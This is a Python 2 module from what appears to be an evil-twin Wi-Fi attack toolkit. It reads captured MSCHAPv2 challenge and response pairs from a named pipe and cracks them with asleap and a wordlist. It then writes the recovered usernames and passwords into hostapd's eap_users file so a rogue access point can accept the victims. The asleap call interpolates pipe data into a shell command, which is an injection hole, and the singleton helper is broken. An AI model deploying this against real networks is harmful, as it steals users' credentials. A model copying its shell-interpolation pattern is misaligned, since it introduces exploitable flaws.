'''

Heavily inspired by Sensepost's crackapd. Go check them out, they did it first:

    github.com/sensepost/hostapd-mana

'''

import os
import errno
import time
import subprocess
import select
import json
import config

from multiprocessing import Process

remote_rig = False

ASLEAP_CMD = 'asleap -C %s -R %s -W %s | grep -v asleap | grep password'
EAP_USERS_ENTRY =  '"%s"\tTTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2\t"%s"\t[2]'

def crack_locally(username, challenge, response, wordlist):

        cmd = ASLEAP_CMD % (challenge, response, wordlist)
        output = subprocess.check_output(cmd, shell=True)
        password = output.split('password:')[1].strip()

        append2eap_users(username, password)

def append2eap_users(username, password):

    # create new entry for eap_users file
    line = EAP_USERS_ENTRY % (username, password)
    
    # append the entry to the file
    with open(config.eap_users_file, 'a') as fd:
        fd.write('%s\n' % line)

def run_autocrack(wordlist):

    try:
        os.mkfifo(config.fifo_path)
    except OSError as e:
        if e.errno != errno.EEXIST:
            raise

    # this is basically a primative event loop
    while True:

        with open(config.fifo_path) as fifo:
            
            print '[fifo reader] FIFO opened'
            while True:

                data = fifo.read()
                if len(data) == 0:
                    print '[fifo reader] writer closed'
                    break

                print '[fifo reader] received data from writer:', data

                data = data.strip().split('|')
                username = data[0]
                challenge = data[1]
                response = data[2]

                if remote_rig:
                    pass
                else:

                    crack_locally(username,
                            challenge,
                            response,
                            wordlist)

class Autocrack(object):

    instance = None

    @staticmethod
    def get_instance():

        if Autocrack.instance is None:
            instance = Autocrack()
        return instance

    def configure(self, wordlist=None):
    
        assert wordlist is not None

        self.wordlist = wordlist

        print '[8] Using wordlist:', self.wordlist

    @staticmethod
    def _start(args):


        print 'test'
        run_autocrack(args['wordlist'])

    def start(self):

        args = {

            'wordlist' : self.wordlist,
        }
        self.proc = Process(target=self._start, args=(args,))
        self.proc.daemon = True
        self.proc.start()
        time.sleep(1)

    def stop(self):

        self.proc.terminate()
        self.proc.join()
